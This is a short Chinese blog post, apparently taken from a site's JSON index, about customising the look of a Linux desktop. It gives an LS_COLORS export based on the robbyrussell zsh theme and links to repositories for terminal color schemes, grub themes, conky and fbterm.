程序太小以至于一句话就说完了……\n终端配色 终端模拟器层 如下仓库，应有尽有：\nhttps://github.com/mbadolato/iTerm2-Color-Schemes\nshell层 shell层的配色只是用色号指定颜色，但相应颜色具体长什么样还得看上述终端模拟器层中定义的RGB值。\n我自己比较喜欢ZSH_THEME=\u0026quot;robbyrussell\u0026quot;的配色：\n1 export LS_COLORS=\u0026#34;rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:\u0026#34; ref：\nhttps://askubuntu.com/questions/466198/how-do-i-change-the-color-for-directories-with-ls-in-the-console http://www.bigsoft.co.uk/blog/2008/04/11/configuring-ls_colors https://geoff.greer.fm/lscolors/ grub 来自gnome-look，但啥都能用，毕竟定制的是grub这个引导器：\nhttps://www.gnome-look.org/browse/cat/109/order/latest/\n桌面状态监测器 使用 conky，仓库如下：\nhttps://github.com/brndnmtthws/conky\n裸体终端模拟器 fbterm好东西，仓库如下：\nhttps://github.com/sfzhi/fbterm\n参考 https://zjuyk.gitlab.io/posts/i3wm-config/ ","date":"2022-05-07T22:50:57+08:00","image":"https://s2.loli.net/2022/05/07/wqH1K7UnExrO4V5.jpg","permalink":"https://cerr.cc/post/%E5%85%B3%E4%BA%8Elinux-ui%E7%9A%84%E7%BE%8E%E5%8C%96%E5%B7%A5%E4%BD%9C/","title":"关于Linux UI的美化工作"}]